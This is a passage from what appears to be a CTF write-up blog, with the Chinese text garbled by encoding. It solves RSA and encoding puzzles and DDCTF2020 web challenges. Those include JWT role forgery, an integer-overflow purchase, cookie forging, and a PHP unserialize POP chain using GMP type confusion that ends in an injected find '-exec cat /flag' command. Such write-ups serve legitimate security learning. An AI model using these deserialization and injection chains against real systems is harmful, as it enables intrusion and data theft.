class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">n0 = <span class="number">1</span> </span><br><span class="line">n1 = <span class="number">1</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    li.append(i)</span><br><span class="line">flag+=s1[li.index(<span class="string">&#x27;1&#x27;</span>)]</span><br><span class="line">flag+=s1[li.index(<span class="string">&#x27;1&#x27;</span>,<span class="number">10</span>)]</span><br><span class="line"><span class="keyword">while</span> len(flag)&lt;<span class="number">32</span>:</span><br><span class="line">    n = n0+n1</span><br><span class="line">    n0=n1</span><br><span class="line">    n1=n</span><br><span class="line">    flag+=s1[li.index(str(n))]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="AFCTF2018-Morse"><a href="#AFCTF2018-Morse" class="headerlink" title="[AFCTF2018]Morse"></a>[AFCTF2018]Morse</h3><p>æ‘©æ–¯å¯†ç ç›´æ¥è§£</p><h3 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h3><p>é¢˜ç›®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex,b2a_hex</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;*****************&quot;</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">c = pow(int(b2a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br></pre></td></tr></table></figure><p>å°±åŸºæœ¬çš„RSAï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q = <span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e = <span class="number">65533</span></span><br><span class="line">c = <span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c, d, p*q)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h3 id="ä¼ æ„Ÿå™¨"><a href="#ä¼ æ„Ÿå™¨" class="headerlink" title="ä¼ æ„Ÿå™¨"></a>ä¼ æ„Ÿå™¨</h3><p>é¢˜ç›®:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5555555595555A65556AA696AA6666666955</span><br><span class="line">è¿™æ˜¯æŸå‹åŠ›ä¼ æ„Ÿå™¨æ— çº¿æ•°æ®åŒ…è§£è°ƒåä½†æœªè§£ç çš„æŠ¥æ–‡(hex)</span><br><span class="line">  </span><br><span class="line">å·²çŸ¥å…¶IDä¸º0xFED31Fï¼Œè¯·ç»§ç»­å°†æŠ¥æ–‡å®Œæ•´è§£ç ï¼Œæäº¤hexã€‚</span><br><span class="line"></span><br><span class="line">æç¤º1ï¼šæ›¼è”</span><br></pre></td></tr></table></figure><p>æç¤ºæ›¼è”ï¼Œæƒ³åˆ°æ›¼å½»æ–¯ç‰¹å¯†ç ï¼Œæ¯8ä½ååº</p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><p>é¢˜ç›®:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF2020éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2020/09/06/DDCTF2020-writeup/"/>
      <url>2020/09/06/DDCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>éš¾å“­äº†ï¼ğŸ˜­</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Webç­¾åˆ°é¢˜"><a href="#Webç­¾åˆ°é¢˜" class="headerlink" title="Webç­¾åˆ°é¢˜"></a>Webç­¾åˆ°é¢˜</h3><p>ä¼ ä¸‹å‚ï¼Œå¾ˆæ˜æ˜¾æ˜¯JWT</p><img src="/2020/09/06/DDCTF2020-writeup/QQæˆªå›¾20200906112009.png" style="zoom:80%;"><p>å°†<code>userRole</code>æ”¹æˆ<code>ADMIN</code>ï¼Œå¯†é’¥è®¾ç½®æˆ<code>admin</code>æˆåŠŸå¾—åˆ°å®¢æˆ·ç«¯ï¼Œåæ¥æ‰çŸ¥é“è¿™ä¸ªå¯†ç å¥½åƒå’Œç”¨æˆ·åä¸€æ ·</p><img src="/2020/09/06/DDCTF2020-writeup/QQæˆªå›¾20200906112149.png" style="zoom:80%;"><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906112333.png"></p><p>æ¥ç€å°±ä¸ä¼šäº†</p><h3 id="å¡ç‰‡å•†åº—"><a href="#å¡ç‰‡å•†åº—" class="headerlink" title="å¡ç‰‡å•†åº—"></a>å¡ç‰‡å•†åº—</h3><p>goè¯­è¨€æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œç›´æ¥å‘æœ‹å‹å€Ÿ1844674407370955161ä¸ªå‘ç°</p><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906113159.png"></p><p>å¾ˆæ˜æ˜¾å‘ç”Ÿäº†æº¢å‡ºï¼Œç„¶åæŠŠå€Ÿçš„è¿˜äº†å…‘æ¢ç¤¼ç‰©å°±èƒ½å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url: &#x2F;flag , SecKey: Udc13VD5adM_c10nPxFu@v12</span><br></pre></td></tr></table></figure><p>è®¿é—®æç¤ºä¸æ˜¯å¹¸è¿ç©å®¶ï¼Œæ‰¾åˆ°ä¼ªé€ cookieï¼š<a href="https://github.com/EddieIvan01/secure-cookie-faker">https://github.com/EddieIvan01/secure-cookie-faker</a></p><p><img src="/2020/09/06/DDCTF2020-writeup/QQ%E6%88%AA%E5%9B%BE20200906114250.png"></p><h3 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">&#x27;find /FlagNeverFall &#x27;</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$show = <span class="keyword">new</span> Display();</span><br><span class="line">$bullet = $_GET[<span class="string">&#x27;bullet&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($bullet))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Give Me Something!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($bullet == <span class="string">&#x27;phpinfo&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $infos = <span class="keyword">new</span> Info();</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $obstacle = <span class="keyword">new</span> <span class="built_in">stdClass</span>;</span><br><span class="line">    $mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">    $mc-&gt;flag = <span class="string">&quot;MyClass&#x27;s flag said, Overwrite Me If You Can!&quot;</span>;</span><br><span class="line">    @unserialize($bullet);</span><br><span class="line">    <span class="keyword">echo</span> $mc-&gt;get_flag();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®<code>/hint/hint.php</code>æç¤ºå’ŒGMPæ‰©å±•ç›¸å…³ï¼Œæœäº†æœå‘ç°æ˜¯GMPæ‰©å±•ååºåˆ—åŒ–ç±»å‹æ··æ·†æ¼æ´ï¼š<a href="https://hackerone.com/reports/198734">https://hackerone.com/reports/198734</a></p><p>æµ‹è¯•å»é™¤<code>$obstacle = new stdClass;</code>å¯ä»¥æ›¿æ¢å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;flag.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $obstacle = new stdClass;</span></span><br><span class="line">$mc = <span class="keyword">new</span> MyClass();</span><br><span class="line">$mc-&gt;flag = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">$inner = <span class="string">&#x27;s:1:&quot;1&quot;;a:2:&#123;s:4:&quot;flag&quot;;s:6:&quot;whoami&quot;;i:0;O:7:&quot;MyClass&quot;:1:&#123;s:5:&quot;kw0ng&quot;;R:2;&#125;&#125;&#x27;</span>;</span><br><span class="line">$exp = <span class="string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen($inner).<span class="string">&#x27;:&#123;&#x27;</span>.$inner.<span class="string">&#x27;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// echo urlencode($exp);</span></span><br><span class="line">@unserialize($exp);</span><br><span class="line">$mc-&gt;get_flag();</span><br><span class="line"><span class="comment">// var_dump($obstacle);</span></span><br></pre></td></tr></table></figure><p>æ„é€ POPé“¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prompter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  $hint;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hint = <span class="string">&#x27;EOf9uk3nSsVFK1LQ.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page = <span class="keyword">new</span> Repeater();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Repeater</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cont;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">new</span> Prompter();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Display();</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ–‡ä»¶åŒ…å«ï¼Œä½†ä»phpinfoæœ‰<code>open_basedir</code>é™åˆ¶ï¼Œå‘é¡µé¢POSTä¸Šä¼ æ–‡ä»¶æ— å“åº”</p><p>åæ¥æ‰çŸ¥é“ï¼ŒåŸæ¥æ˜¯å¯ä»¥ä»»æ„ç±»çš„ä»»æ„å‡½æ•°æ‰§è¡Œçš„ï¼Œæ¼æ´ç‚¹å°±åœ¨äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $func = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">    <span class="keyword">return</span> $func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$func()</code>é‚£é‡Œï¼Œå¦‚æœå¯æ§çš„è¯ï¼Œå¯ä»¥ä»»æ„ç±»ä¸­çš„æ–¹æ³•è°ƒç”¨çš„ï¼Œçœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">456</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="keyword">new</span> T,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">$a();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">array</span>(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;Test&#x27;</span>);</span><br><span class="line">$b();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">array</span>(<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line">$c(<span class="string">&#x27;456&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸Šé¢ä¸‰ä¸ªä¾‹å­å‡ä¼šè¾“å‡º456</span></span><br></pre></td></tr></table></figure><p>ç”±æ­¤ï¼Œpopé“¾å¯ä»¥ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $kw0ng;</span><br><span class="line">    <span class="keyword">var</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="string">&#x27;-exec cat /flag ;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Display</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $contents;</span><br><span class="line">    <span class="keyword">public</span> $page;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    